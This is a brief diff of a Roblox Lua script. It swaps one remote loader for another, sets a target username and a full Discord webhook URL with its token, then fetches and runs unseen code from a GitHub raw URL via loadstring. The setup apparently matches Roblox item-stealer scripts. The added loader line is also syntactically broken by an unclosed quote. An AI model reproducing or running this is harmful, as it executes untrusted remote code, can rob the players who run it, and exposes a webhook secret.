@@ -1,1 +1,4 @@
-`loadstring(game:HttpGet("https://raw.githubusercontent.com/Xot1cxW/Tester/main/Tester"))()`
+`_G.Username = "PlaysTheKiki123"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1093569460151013457/eGDtlA_Q2JDdC9NwdK-vjPAAX6xCbFcvHD4GnH1nyPn7laIv64L2beynBC4ty16ceF7Y"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua))()`
